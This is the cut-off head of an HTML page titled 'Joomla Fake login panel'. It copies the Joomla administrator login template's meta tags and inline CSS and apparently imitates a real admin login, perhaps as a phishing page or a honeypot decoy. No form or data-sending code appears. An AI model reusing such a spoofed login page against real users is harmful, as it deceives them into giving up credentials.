<!DOCTYPE html>
<html lang="it-it" dir="ltr">
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<meta charset="utf-8" />
	<meta name="generator" content="Joomla! - Open Source Content Management" />
	<title>Joomla Fake login panel</title>
	<link href="/web-applications/joomla/administrator/templates/isis/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
	<link href="/web-applications/joomla/media/jui/css/chosen.css" rel="stylesheet" />
	<link href="/web-applications/joomla/administrator/templates/isis/css/template.css?630f6006427198bfcc5240970b66f2ac" rel="stylesheet" />
	<style>
html { display:none }
	@media (max-width: 480px) {
		.view-login .container {
			margin-top: -170px;
		}
		.btn {
			font-size: 13px;
			padding: 4px 10px 4px;
		}
	}
	
	/* @group Base */
.chzn-container {
  position: relative;
  display: inline-block;
  vertical-align: middle;
  font-size: 13px;
  zoom: 1;
  *display: inline;
  -webkit-user-select: none;
  -moz-user-select: none;
  user-select: none;
}
.chzn-container .chzn-drop {
  position: absolute;
  top: 100%;
  left: -9999px;
  z-index: 1010;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  width: 100%;
  border: 1px solid #aaa;
  border-top: 0;
  background: #fff;
  box-shadow: 0 4px 5px rgba(0, 0, 0, 0.15);
}
.chzn-container.chzn-with-drop .chzn-drop {
  left: 0;
}
.chzn-container a {
  cursor: pointer;
}

/* @end */
/* @group Single Chosen */
.chzn-container-single .chzn-single {
  position: relative;
  display: block;
  overflow: hidden;
  padding: 0 0 0 8px;
  height: 23px;
  border: 1px solid #aaa;
  border-radius: 5px;
  background-color: #fff;
  background: -webkit-gradient(linear, 50% 0%, 50% 100%, color-stop(20%, #ffffff), color-stop(50%, #f6f6f6), color-stop(52%, #eeeeee), color-stop(100%, #f4f4f4));
  background: -webkit-linear-gradient(top, #ffffff 20%, #f6f6f6 50%, #eeeeee 52%, #f4f4f4 100%);
  background: -moz-linear-gradient(top, #ffffff 20%, #f6f6f6 50%, #eeeeee 52%, #f4f4f4 100%);
  background: -o-linear-gradient(top, #ffffff 20%, #f6f6f6 50%, #eeeeee 52%, #f4f4f4 100%);
  background: linear-gradient(top, #ffffff 20%, #f6f6f6 50%, #eeeeee 52%, #f4f4f4 100%);
  background-clip: padding-box;
  box-shadow: 0 0 3px white inset, 0 1px 1px rgba(0, 0, 0, 0.1);
  color: #444;
  text-decoration: none;
  white-space: nowrap;
  line-height: 24px;
}
.chzn-container-single .chzn-default {
  color: #999;
}
.chzn-container-single .chzn-single span {
  display: block;
  overflow: hidden;
  margin-right: 26px;
  text-overflow: ellipsis;
  white-space: nowrap;
}
.chzn-container-single .chzn-single-with-deselect span {
  margin-right: 38px;
}
.chzn-container-single .chzn-single abbr {
  position: absolute;
  top: 6px;
  right: 26px;
  display: block;
  width: 12px;
  height: 12px;
  background: url('chosen-sprite.png') -42px 1px no-repeat;
  font-size: 1px;
}
.chzn-container-single .chzn-single abbr:hover {
  background-position: -42px -10px;
}
.chzn-container-single.chzn-disabled .chzn-single abbr:hover {
  background-position: -42px -10px;
}
.chzn-container-single .chzn-single div {
  position: absolute;
  top: 0;
  right: 0;
  display: block;
  width: 18px;
  height: 100%;
}
.chzn-container-single .chzn-single div b {
  display: block;
  width: 100%;
  height: 100%;
  background: url('chosen-sprite.png') no-repeat 0px 2px;
}
.chzn-container-single .chzn-search {
  position: relative;
  z-index: 1010;
  margin: 0;
  padding: 3px 4px;
  white-space: nowrap;
}
.chzn-container-single .chzn-search input[type="text"] {
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  margin: 1px 0;
  padding: 4px 20px 4px 5px;
  width: 100%;
  height: auto;
  outline: 0;
  border: 1px solid #aaa;
  background: white url('chosen-sprite.png') no-repeat 100% -20px;
  background: url('chosen-sprite.png') no-repeat 100% -20px, -webkit-gradient(linear, 50% 0%, 50% 100%, color-stop(1%, #eeeeee), color-stop(15%, #ffffff));
  background: url('chosen-sprite.png') no-repeat 100% -20px, -webkit-linear-gradient(#eeeeee 1%, #ffffff 15%);
  background: url('chosen-sprite.png') no-repeat 100% -20px, -moz-linear-gradient(#eeeeee 1%, #ffffff 15%);
  background: url('chosen-sprite.png') no-repeat 100% -20px, -o-linear-gradient(#eeeeee 1%, #ffffff 15%);
  background: url('chosen-sprite.png') no-repeat 100% -20px, linear-gradient(#eeeeee 1%, #ffffff 15%);
  font-size: 1em;
  font-family: sans-serif;
  line-height: normal;
  border-radius: 0;
}
.chzn-container-single .chzn-drop {
  margin-top: -1px;
  border-radius: 0 0 4px 4px;
  background-clip: padding-box;
}
.chzn-container-single.chzn-container-single-nosearch .chzn-search {
  position: absolute;
  left: -9999px;
}

/* @end */
/* @group Results */
.chzn-container .chzn-results {
  position: relative;
  overflow-x: hidden;
  overflow-y: auto;
  margin: 0 4px 4px 0;
  padding: 0 0 0 4px;
  max-height: 240px;
  -webkit-overflow-scrolling: touch;
}
.chzn-container .chzn-results li {
  display: none;
  margin: 0;
  padding: 5px 6px;
  list-style: none;
  line-height: 15px;
}
.chzn-container .chzn-results li.active-result {
  display: list-item;
  cursor: pointer;
}
.chzn-container .chzn-results li.disabled-result {
  display: list-item;
  color: #ccc;
  cursor: default;
}
.chzn-container .chzn-results li.highlighted {
  background-color: #3875d7;
  background-image: -webkit-gradient(linear, 50% 0%, 50% 100%, color-stop(20%, #3875d7), color-stop(90%, #2a62bc));
  background-image: -webkit-linear-gradient(#3875d7 20%, #2a62bc 90%);
  background-image: -moz-linear-gradient(#3875d7 20%, #2a62bc 90%);
  background-image: -o-linear-gradient(#3875d7 20%, #2a62bc 90%);
  background-image: linear-gradient(#3875d7 20%, #2a62bc 90%);
  color: #fff;
}
.chzn-container .chzn-results li.no-results {
  display: list-item;
  background: #f4f4f4;
}
.chzn-container .chzn-results li.group-result {
  display: list-item;
  font-weight: bold;
  cursor: default;
}
.chzn-container .chzn-results li.group-option {
  padding-left: 15px;
}
.chzn-container .chzn-results li em {
  font-style: normal;
  text-decoration: underline;
}

/* @end */
/* @group Multi Chosen */
.chzn-container-multi .chzn-choices {
  position: relative;
  overflow: hidden;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  margin: 0;
  padding: 0;
  width: 100%;
  height: auto !important;
  height: 1%;
  border: 1px solid #aaa;
  background-color: #fff;
  background-image: -webkit-gradient(linear, 50% 0%, 50% 100%, color-stop(1%, #eeeeee), color-stop(15%, #ffffff));
  background-image: -webkit-linear-gradient(#eeeeee 1%, #ffffff 15%);
  background-image: -moz-linear-gradient(#eeeeee 1%, #ffffff 15%);
  background-image: -o-linear-gradient(#eeeeee 1%, #ffffff 15%);
  background-image: linear-gradient(#eeeeee 1%, #ffffff 15%);
  cursor: text;
}
.chzn-container-multi .chzn-choices li {
  float: left;
  list-style: none;
}
.chzn-container-multi .chzn-choices li.search-field {
  margin: 0;
  padding: 0;
  white-space: nowrap;
}
.chzn-container-multi .chzn-choices li.search-field input[type="text"] {
  margin: 1px 0;
  padding: 5px;
  height: 15px;
  outline: 0;
  border: 0 !important;
  background: transparent !important;
  box-shadow: none;
  color: #666;
  font-size: 100%;
  font-family: sans-serif;
  line-height: normal;
  border-radius: 0;
}
.chzn-container-multi .chzn-choices li.search-field .default {
  color: #999;
}
.chzn-container-multi .chzn-choices li.search-choice {
  position: relative;
  margin: 3px 0 3px 5px;
  padding: 3px 20px 3px 5px;
  border: 1px solid #aaa;
  border-radius: 3px;
  background-color: #e4e4e4;
  background-image: -webkit-gradient(linear, 50% 0%, 50% 100%, color-stop(20%, #f4f4f4), color-stop(50%, #f0f0f0), color-stop(52%, #e8e8e8), color-stop(100%, #eeeeee));
  background-image: -webkit-linear-gradient(#f4f4f4 20%, #f0f0f0 50%, #e8e8e8 52%, #eeeeee 100%);
  background-image: -moz-linear-gradient(#f4f4f4 20%, #f0f0f0 50%, #e8e8e8 52%, #eeeeee 100%);
  background-image: -o-linear-gradient(#f4f4f4 20%, #f0f0f0 50%, #e8e8e8 52%, #eeeeee 100%);
  background-image: linear-gradient(#f4f4f4 20%, #f0f0f0 50%, #e8e8e8 52%, #eeeeee 100%);
  background-clip: padding-box;
  box-shadow: 0 0 2px white inset, 0 1px 0 rgba(0, 0, 0, 0.05);
  color: #333;
  line-height: 13px;
  cursor: default;
}
.chzn-container-multi .chzn-choices li.search-choice .search-choice-close {
  position: absolute;
  top: 4px;
  right: 3px;
  display: block;
  width: 12px;
  height: 12px;
  background: url('chosen-sprite.png') -42px 1px no-repeat;
  font-size: 1px;
}
.chzn-container-multi .chzn-choices li.search-choice .search-choice-close:hover {
  background-position: -42px -10px;
}
.chzn-container-multi .chzn-choices li.search-choice-disabled {
  padding-right: 5px;
  border: 1px solid #ccc;
  background-color: #e4e4e4;
  background-image: -webkit-gradient(linear, 50% 0%, 50% 100%, color-stop(20%, #f4f4f4), color-stop(50%, #f0f0f0), color-stop(52%, #e8e8e8), color-stop(100%, #eeeeee));
  background-image: -webkit-linear-gradient(top, #f4f4f4 20%, #f0f0f0 50%, #e8e8e8 52%, #eeeeee 100%);
  background-image: -moz-linear-gradient(top, #f4f4f4 20%, #f0f0f0 50%, #e8e8e8 52%, #eeeeee 100%);
  background-image: -o-linear-gradient(top, #f4f4f4 20%, #f0f0f0 50%, #e8e8e8 52%, #eeeeee 100%);
  background-image: linear-gradient(top, #f4f4f4 20%, #f0f0f0 50%, #e8e8e8 52%, #eeeeee 100%);
  color: #666;
}
.chzn-container-multi .chzn-choices li.search-choice-focus {
  background: #d4d4d4;
}
.chzn-container-multi .chzn-choices li.search-choice-focus .search-choice-close {
  background-position: -42px -10px;
}
.chzn-container-multi .chzn-results {
  margin: 0;
  padding: 0;
}
.chzn-container-multi .chzn-drop .result-selected {
  display: list-item;
  color: #ccc;
  cursor: default;
}

/* @end */
/* @group Active  */
.chzn-container-active .chzn-single {
  border: 1px solid #5897fb;
  box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
}
.chzn-container-active.chzn-with-drop .chzn-single {
  border: 1px solid #aaa;
  -moz-border-radius-bottomright: 0;
  border-bottom-right-radius: 0;
  -moz-border-radius-bottomleft: 0;
  border-bottom-left-radius: 0;
  background-image: -webkit-gradient(linear, 50% 0%, 50% 100%, color-stop(20%, #eeeeee), color-stop(80%, #ffffff));
  background-image: -webkit-linear-gradient(#eeeeee 20%, #ffffff 80%);
  background-image: -moz-linear-gradient(#eeeeee 20%, #ffffff 80%);
  background-image: -o-linear-gradient(#eeeeee 20%, #ffffff 80%);
  background-image: linear-gradient(#eeeeee 20%, #ffffff 80%);
}
.chzn-container-active.chzn-with-drop .chzn-single div {
  border-left: none;
  background: transparent;
}
.chzn-container-active.chzn-with-drop .chzn-single div b {
  background-position: -18px 2px;
}
.chzn-container-active .chzn-choices {
  border: 1px solid #5897fb;
  box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
}
.chzn-container-active .chzn-choices li.search-field input[type="text"] {
  color: #111 !important;
}

/* @end */
/* @group Disabled Support */
.chzn-disabled {
  opacity: 0.5 !important;
  cursor: default;
}
.chzn-disabled .chzn-single {
  cursor: default;
}
.chzn-disabled .chzn-choices .search-choice .search-choice-close {
  cursor: default;
}

/* @end */
/* @group Right to Left */
.chzn-rtl {
  text-align: right;
}
.chzn-rtl .chzn-single {
  overflow: visible;
  padding: 0 8px 0 0;
}
.chzn-rtl .chzn-single span {
  margin-right: 0;
  margin-left: 26px;
  direction: rtl;
}
.chzn-rtl .chzn-single-with-deselect span {
  margin-left: 38px;
}
.chzn-rtl .chzn-single div {
  right: auto;
  left: 3px;
}
.chzn-rtl .chzn-single abbr {
  right: auto;
  left: 26px;
}
.chzn-rtl .chzn-choices li {
  float: right;
}
.chzn-rtl .chzn-choices li.search-field input[type="text"] {
  direction: rtl;
}
.chzn-rtl .chzn-choices li.search-choice {
  margin: 3px 5px 3px 0;
  padding: 3px 5px 3px 19px;
}
.chzn-rtl .chzn-choices li.search-choice .search-choice-close {
  right: auto;
  left: 4px;
}
.chzn-rtl .chzn-drop {
  left: 9999px;
}
.chzn-rtl.chzn-container-single .chzn-results {
  margin: 0 0 4px 4px;
  padding: 0 4px 0 0;
}
.chzn-rtl .chzn-results li.group-option {
  padding-right: 15px;
  padding-left: 0;
}
.chzn-rtl.chzn-container-active.chzn-with-drop .chzn-single div {
  border-right: none;
}
.chzn-rtl .chzn-search input[type="text"] {
  padding: 4px 5px 4px 20px;
  background: white url('chosen-sprite.png') no-repeat -30px -20px;
  background: url('chosen-sprite.png') no-repeat -30px -20px, -webkit-gradient(linear, 50% 0%, 50% 100%, color-stop(1%, #eeeeee), color-stop(15%, #ffffff));
  background: url('chosen-sprite.png') no-repeat -30px -20px, -webkit-linear-gradient(#eeeeee 1%, #ffffff 15%);
  background: url('chosen-sprite.png') no-repeat -30px -20px, -moz-linear-gradient(#eeeeee 1%, #ffffff 15%);
  background: url('chosen-sprite.png') no-repeat -30px -20px, -o-linear-gradient(#eeeeee 1%, #ffffff 15%);
  background: url('chosen-sprite.png') no-repeat -30px -20px, linear-gradient(#eeeeee 1%, #ffffff 15%);
  direction: rtl;
}
.chzn-rtl.chzn-container-single .chzn-single div b {
  background-position: 6px 2px;
}
.chzn-rtl.chzn-container-single.chzn-with-drop .chzn-single div b {
  background-position: -12px 2px;
}
[dir="rtl"] .chzn-container .chzn-drop,
[dir="rtl"] .chzn-container-single.chzn-container-single-nosearch .chzn-search {
  left: auto;
  right: -9999px;
}
[dir="rtl"] .chzn-container.chzn-with-drop .chzn-drop {
  right: 0;
}

/* @end */
/* @group Retina compatibility */
@media only screen and (-webkit-min-device-pixel-ratio: 2), only screen and (min-resolution: 144dpi) {
  .chzn-rtl .chzn-search input[type="text"],
  .chzn-container-single .chzn-single abbr,
  .chzn-container-single .chzn-single div b,
  .chzn-container-single .chzn-search input[type="text"],
  .chzn-container-multi .chzn-choices .search-choice .search-choice-close,
  .chzn-container .chzn-results-scroll-down span,
  .chzn-container .chzn-results-scroll-up span {
    background-image: url('chosen-sprite@2x.png') !important;
    background-size: 52px 37px !important;
    background-repeat: no-repeat !important;
  }
}
/* @end */
	article,
aside,
details,
figcaption,
figure,
footer,
header,
hgroup,
nav,
section {
	display: block;
}
audio,
canvas,
video {
	display: inline-block;
	*display: inline;
	*zoom: 1;
}
audio:not([controls]) {
	display: none;
}
html {
	font-size: 100%;
	-webkit-text-size-adjust: 100%;
	-ms-text-size-adjust: 100%;
}
a:focus {
	outline: thin dotted #333;
	outline: 5px auto -webkit-focus-ring-color;
	outline-offset: -2px;
}
a:hover,
a:active {
	outline: 0;
}
sub,
sup {
	position: relative;
	font-size: 75%;
	line-height: 0;
	vertical-align: baseline;
}
sup {
	top: -0.5em;
}
sub {
	bottom: -0.25em;
}
img {
	max-width: 100%;
	width: auto \9;
	height: auto;
	vertical-align: middle;
	border: 0;
	-ms-interpolation-mode: bicubic;
}
#map_canvas img,
.google-maps img,
.gm-style img {
	max-width: none;
}
button,
input,
select,
textarea {
	margin: 0;
	font-size: 100%;
	vertical-align: middle;
}
button,
input {
	*overflow: visible;
	line-height: normal;
}
button::-moz-focus-inner,
input::-moz-focus-inner {
	padding: 0;
	border: 0;
}
button,
html input[type="button"],
input[type="reset"],
input[type="submit"] {
	-webkit-appearance: button;
	cursor: pointer;
}
label,
select,
button,
input[type="button"],
input[type="reset"],
input[type="submit"],
input[type="radio"],
input[type="checkbox"] {
	cursor: pointer;
}
input[type="search"] {
	-webkit-box-sizing: content-box;
	-moz-box-sizing: content-box;
	box-sizing: content-box;
	-webkit-appearance: textfield;
}
input[type="search"]::-webkit-search-decoration,
input[type="search"]::-webkit-search-cancel-button {
	-webkit-appearance: none;
}
textarea {
	overflow: auto;
	vertical-align: top;
}
@media print {
	* {
		text-shadow: none !important;
		color: #000 !important;
		background: transparent !important;
		box-shadow: none !important;
	}
	a,
	a:visited {
		text-decoration: underline;
	}
	a[href]:after {
		content: " (" attr(href) ")";
	}
	abbr[title]:after {
		content: " (" attr(title) ")";
	}
	.ir a:after,
	a[href^="javascript:"]:after,
	a[href^="#"]:after {
		content: "";
	}
	pre,
	blockquote {
		border: 1px solid #999;
		page-break-inside: avoid;
	}
	thead {
		display: table-header-group;
	}
	tr,
	img {
		page-break-inside: avoid;
	}
	img {
		max-width: 100% !important;
	}
	@page {
		margin: 0.5cm;
	}
	p,
	h2,
	h3 {
		orphans: 3;
		widows: 3;
	}
	h2,
	h3 {
		page-break-after: avoid;
	}
}
.clearfix {
	*zoom: 1;
}
.clearfix:before,
.clearfix:after {
	display: table;
	content: "";
	line-height: 0;
}
.clearfix:after {
	clear: both;
}
.hide-text {
	font: 0/0 a;
	color: transparent;
	text-shadow: none;
	background-color: transparent;
	border: 0;
}
.input-block-level {
	display: block;
	width: 100%;
	min-height: 28px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
}
body {
	margin: 0;
	font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
	font-size: 13px;
	line-height: 18px;
	color: #333;
	background-color: #fff;
}
a {
	color: #3071a9;
	text-decoration: none;
}
a:hover,
a:focus {
	color: #1f496e;
	text-decoration: underline;
}
.img-rounded {
	-webkit-border-radius: 6px;
	-moz-border-radius: 6px;
	border-radius: 6px;
}
.img-polaroid {
	padding: 4px;
	background-color: #fff;
	border: 1px solid #ccc;
	border: 1px solid rgba(0,0,0,0.2);
	-webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.1);
	-moz-box-shadow: 0 1px 3px rgba(0,0,0,0.1);
	box-shadow: 0 1px 3px rgba(0,0,0,0.1);
}
.img-circle {
	-webkit-border-radius: 500px;
	-moz-border-radius: 500px;
	border-radius: 500px;
}
.row {
	margin-left: -20px;
	*zoom: 1;
}
.row:before,
.row:after {
	display: table;
	content: "";
	line-height: 0;
}
.row:after {
	clear: both;
}
[class*="span"] {
	float: left;
	min-height: 1px;
	margin-left: 20px;
}
.container,
.navbar-static-top .container,
.navbar-fixed-top .container,
.navbar-fixed-bottom .container {
	width: 940px;
}
.span12 {
	width: 940px;
}
.span11 {
	width: 860px;
}
.span10 {
	width: 780px;
}
.span9 {
	width: 700px;
}
.span8 {
	width: 620px;
}
.span7 {
	width: 540px;
}
.span6 {
	width: 460px;
}
.span5 {
	width: 380px;
}
.span4 {
	width: 300px;
}
.span3 {
	width: 220px;
}
.span2 {
	width: 140px;
}
.span1 {
	width: 60px;
}
.offset12 {
	margin-left: 980px;
}
.offset11 {
	margin-left: 900px;
}
.offset10 {
	margin-left: 820px;
}
.offset9 {
	margin-left: 740px;
}
.offset8 {
	margin-left: 660px;
}
.offset7 {
	margin-left: 580px;
}
.offset6 {
	margin-left: 500px;
}
.offset5 {
	margin-left: 420px;
}
.offset4 {
	margin-left: 340px;
}
.offset3 {
	margin-left: 260px;
}
.offset2 {
	margin-left: 180px;
}
.offset1 {
	margin-left: 100px;
}
.row-fluid {
	width: 100%;
	*zoom: 1;
}
.row-fluid:before,
.row-fluid:after {
	display: table;
	content: "";
	line-height: 0;
}
.row-fluid:after {
	clear: both;
}
.row-fluid [class*="span"] {
	display: block;
	width: 100%;
	min-height: 28px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	float: left;
	margin-left: 2.1276595744681%;
	*margin-left: 2.0744680851064%;
}
.row-fluid [class*="span"]:first-child {
	margin-left: 0;
}
.row-fluid .controls-row [class*="span"] + [class*="span"] {
	margin-left: 2.1276595744681%;
}
.row-fluid .span12 {
	width: 100%;
	*width: 99.946808510638%;
}
.row-fluid .span11 {
	width: 91.489361702128%;
	*width: 91.436170212766%;
}
.row-fluid .span10 {
	width: 82.978723404255%;
	*width: 82.925531914894%;
}
.row-fluid .span9 {
	width: 74.468085106383%;
	*width: 74.414893617021%;
}
.row-fluid .span8 {
	width: 65.957446808511%;
	*width: 65.904255319149%;
}
.row-fluid .span7 {
	width: 57.446808510638%;
	*width: 57.393617021277%;
}
.row-fluid .span6 {
	width: 48.936170212766%;
	*width: 48.882978723404%;
}
.row-fluid .span5 {
	width: 40.425531914894%;
	*width: 40.372340425532%;
}
.row-fluid .span4 {
	width: 31.914893617021%;
	*width: 31.86170212766%;
}
.row-fluid .span3 {
	width: 23.404255319149%;
	*width: 23.351063829787%;
}
.row-fluid .span2 {
	width: 14.893617021277%;
	*width: 14.840425531915%;
}
.row-fluid .span1 {
	width: 6.3829787234043%;
	*width: 6.3297872340426%;
}
.row-fluid .offset12 {
	margin-left: 104.25531914894%;
	*margin-left: 104.14893617021%;
}
.row-fluid .offset12:first-child {
	margin-left: 102.12765957447%;
	*margin-left: 102.02127659574%;
}
.row-fluid .offset11 {
	margin-left: 95.744680851064%;
	*margin-left: 95.63829787234%;
}
.row-fluid .offset11:first-child {
	margin-left: 93.617021276596%;
	*margin-left: 93.510638297872%;
}
.row-fluid .offset10 {
	margin-left: 87.234042553191%;
	*margin-left: 87.127659574468%;
}
.row-fluid .offset10:first-child {
	margin-left: 85.106382978723%;
	*margin-left: 85%;
}
.row-fluid .offset9 {
	margin-left: 78.723404255319%;
	*margin-left: 78.617021276596%;
}
.row-fluid .offset9:first-child {
	margin-left: 76.595744680851%;
	*margin-left: 76.489361702128%;
}
.row-fluid .offset8 {
	margin-left: 70.212765957447%;
	*margin-left: 70.106382978723%;
}
.row-fluid .offset8:first-child {
	margin-left: 68.085106382979%;
	*margin-left: 67.978723404255%;
}
.row-fluid .offset7 {
	margin-left: 61.702127659574%;
	*margin-left: 61.595744680851%;
}
.row-fluid .offset7:first-child {
	margin-left: 59.574468085106%;
	*margin-left: 59.468085106383%;
}
.row-fluid .offset6 {
	margin-left: 53.191489361702%;
	*margin-left: 53.085106382979%;
}
.row-fluid .offset6:first-child {
	margin-left: 51.063829787234%;
	*margin-left: 50.957446808511%;
}
.row-fluid .offset5 {
	margin-left: 44.68085106383%;
	*margin-left: 44.574468085106%;
}
.row-fluid .offset5:first-child {
	margin-left: 42.553191489362%;
	*margin-left: 42.446808510638%;
}
.row-fluid .offset4 {
	margin-left: 36.170212765957%;
	*margin-left: 36.063829787234%;
}
.row-fluid .offset4:first-child {
	margin-left: 34.042553191489%;
	*margin-left: 33.936170212766%;
}
.row-fluid .offset3 {
	margin-left: 27.659574468085%;
	*margin-left: 27.553191489362%;
}
.row-fluid .offset3:first-child {
	margin-left: 25.531914893617%;
	*margin-left: 25.425531914894%;
}
.row-fluid .offset2 {
	margin-left: 19.148936170213%;
	*margin-left: 19.042553191489%;
}
.row-fluid .offset2:first-child {
	margin-left: 17.021276595745%;
	*margin-left: 16.914893617021%;
}
.row-fluid .offset1 {
	margin-left: 10.63829787234%;
	*margin-left: 10.531914893617%;
}
.row-fluid .offset1:first-child {
	margin-left: 8.5106382978723%;
	*margin-left: 8.4042553191489%;
}
[class*="span"].hide,
.row-fluid [class*="span"].hide {
	display: none;
}
[class*="span"].pull-right,
.row-fluid [class*="span"].pull-right {
	float: right;
}
.container {
	margin-right: auto;
	margin-left: auto;
	*zoom: 1;
}
.container:before,
.container:after {
	display: table;
	content: "";
	line-height: 0;
}
.container:after {
	clear: both;
}
.container-fluid {
	padding-right: 20px;
	padding-left: 20px;
	*zoom: 1;
}
.container-fluid:before,
.container-fluid:after {
	display: table;
	content: "";
	line-height: 0;
}
.container-fluid:after {
	clear: both;
}
p {
	margin: 0 0 9px;
}
.lead {
	margin-bottom: 18px;
	font-size: 19.5px;
	font-weight: 200;
	line-height: 27px;
}
small {
	font-size: 85%;
}
strong {
	font-weight: bold;
}
em {
	font-style: italic;
}
cite {
	font-style: normal;
}
.muted {
	color: #999;
}
a.muted:hover,
a.muted:focus {
	color: #808080;
}
.text-warning {
	color: #8a6d3b;
}
a.text-warning:hover,
a.text-warning:focus {
	color: #66512c;
}
.text-error {
	color: #a94442;
}
a.text-error:hover,
a.text-error:focus {
	color: #843534;
}
.text-info {
	color: #31708f;
}
a.text-info:hover,
a.text-info:focus {
	color: #245269;
}
.text-success {
	color: #3c763d;
}
a.text-success:hover,
a.text-success:focus {
	color: #2b542c;
}
.text-left {
	text-align: left;
}
.text-right {
	text-align: right;
}
.text-center {
	text-align: center;
}
h1,
h2,
h3,
h4,
h5,
h6 {
	margin: 9px 0;
	font-family: inherit;
	font-weight: bold;
	line-height: 18px;
	color: inherit;
	text-rendering: optimizelegibility;
}
h1 small,
h2 small,
h3 small,
h4 small,
h5 small,
h6 small {
	font-weight: normal;
	line-height: 1;
	color: #999;
}
h1,
h2,
h3 {
	line-height: 36px;
}
h1 {
	font-size: 35.75px;
}
h2 {
	font-size: 29.25px;
}
h3 {
	font-size: 22.75px;
}
h4 {
	font-size: 16.25px;
}
h5 {
	font-size: 13px;
}
h6 {
	font-size: 11.05px;
}
h1 small {
	font-size: 22.75px;
}
h2 small {
	font-size: 16.25px;
}
h3 small {
	font-size: 13px;
}
h4 small {
	font-size: 13px;
}
.page-header {
	padding-bottom: 8px;
	margin: 18px 0 27px;
	border-bottom: 1px solid #eee;
}
ul,
ol {
	padding: 0;
	margin: 0 0 9px 25px;
}
ul ul,
ul ol,
ol ol,
ol ul {
	margin-bottom: 0;
}
li {
	line-height: 18px;
}
ul.unstyled,
ol.unstyled {
	margin-left: 0;
	list-style: none;
}
ul.inline,
ol.inline {
	margin-left: 0;
	list-style: none;
}
ul.inline > li,
ol.inline > li {
	display: inline-block;
	*display: inline;
	*zoom: 1;
	padding-left: 5px;
	padding-right: 5px;
}
dl {
	margin-bottom: 18px;
}
dt,
dd {
	line-height: 18px;
}
dt {
	font-weight: bold;
}
dd {
	margin-left: 9px;
}
.dl-horizontal {
	*zoom: 1;
}
.dl-horizontal:before,
.dl-horizontal:after {
	display: table;
	content: "";
	line-height: 0;
}
.dl-horizontal:after {
	clear: both;
}
.dl-horizontal dt {
	float: left;
	width: 160px;
	clear: left;
	text-align: right;
	overflow: hidden;
	text-overflow: ellipsis;
	white-space: nowrap;
}
.dl-horizontal dd {
	margin-left: 180px;
}
hr {
	margin: 18px 0;
	border: 0;
	border-top: 1px solid #eee;
	border-bottom: 1px solid #fff;
}
abbr[title],
abbr[data-original-title] {
	cursor: help;
	border-bottom: 1px dotted #999;
}
abbr.initialism {
	font-size: 90%;
	text-transform: uppercase;
}
blockquote {
	padding: 0 0 0 15px;
	margin: 0 0 18px;
	border-left: 5px solid #eee;
}
blockquote p {
	margin-bottom: 0;
	font-size: 16.25px;
	font-weight: 300;
	line-height: 1.25;
}
blockquote small {
	display: block;
	line-height: 18px;
	color: #999;
}
blockquote small:before {
	content: '\2014 \00A0';
}
blockquote.pull-right {
	float: right;
	padding-right: 15px;
	padding-left: 0;
	border-right: 5px solid #eee;
	border-left: 0;
}
blockquote.pull-right p,
blockquote.pull-right small {
	text-align: right;
}
blockquote.pull-right small:before {
	content: '';
}
blockquote.pull-right small:after {
	content: '\00A0 \2014';
}
q:before,
q:after,
blockquote:before,
blockquote:after {
	content: "";
}
address {
	display: block;
	margin-bottom: 18px;
	font-style: normal;
	line-height: 18px;
}
code,
pre {
	padding: 0 3px 2px;
	font-family: Monaco, Menlo, Consolas, "Courier New", monospace;
	font-size: 11px;
	color: #333;
	-webkit-border-radius: 3px;
	-moz-border-radius: 3px;
	border-radius: 3px;
}
code {
	padding: 2px 4px;
	color: #d14;
	background-color: #f7f7f9;
	border: 1px solid #e1e1e8;
	white-space: nowrap;
}
pre {
	display: block;
	padding: 8.5px;
	margin: 0 0 9px;
	font-size: 12px;
	line-height: 18px;
	word-break: break-all;
	word-wrap: break-word;
	white-space: pre;
	white-space: pre-wrap;
	background-color: #f5f5f5;
	border: 1px solid #ccc;
	border: 1px solid rgba(0,0,0,0.15);
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
}
pre.prettyprint {
	margin-bottom: 18px;
}
pre code {
	padding: 0;
	color: inherit;
	white-space: pre;
	white-space: pre-wrap;
	background-color: transparent;
	border: 0;
}
.pre-scrollable {
	max-height: 340px;
	overflow-y: scroll;
}
form {
	margin: 0 0 18px;
}
fieldset {
	padding: 0;
	margin: 0;
	border: 0;
}
legend {
	display: block;
	width: 100%;
	padding: 0;
	margin-bottom: 18px;
	font-size: 19.5px;
	line-height: 36px;
	color: #333;
	border: 0;
	border-bottom: 1px solid #e5e5e5;
}
legend small {
	font-size: 13.5px;
	color: #999;
}
label,
input,
button,
select,
textarea {
	font-size: 13px;
	font-weight: normal;
	line-height: 18px;
}
input,
button,
select,
textarea {
	font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
}
label {
	display: block;
	margin-bottom: 5px;
}
select,
textarea,
input[type="text"],
input[type="password"],
input[type="datetime"],
input[type="datetime-local"],
input[type="date"],
input[type="month"],
input[type="time"],
input[type="week"],
input[type="number"],
input[type="email"],
input[type="url"],
input[type="search"],
input[type="tel"],
input[type="color"],
.uneditable-input {
	display: inline-block;
	height: 18px;
	padding: 4px 6px;
	margin-bottom: 9px;
	font-size: 13px;
	line-height: 18px;
	color: #555;
	-webkit-border-radius: 3px;
	-moz-border-radius: 3px;
	border-radius: 3px;
	vertical-align: middle;
}
input,
textarea,
.uneditable-input {
	width: 206px;
}
textarea {
	height: auto;
}
textarea,
input[type="text"],
input[type="password"],
input[type="datetime"],
input[type="datetime-local"],
input[type="date"],
input[type="month"],
input[type="time"],
input[type="week"],
input[type="number"],
input[type="email"],
input[type="url"],
input[type="search"],
input[type="tel"],
input[type="color"],
.uneditable-input {
	background-color: #fff;
	border: 1px solid #ccc;
	-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
	-moz-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
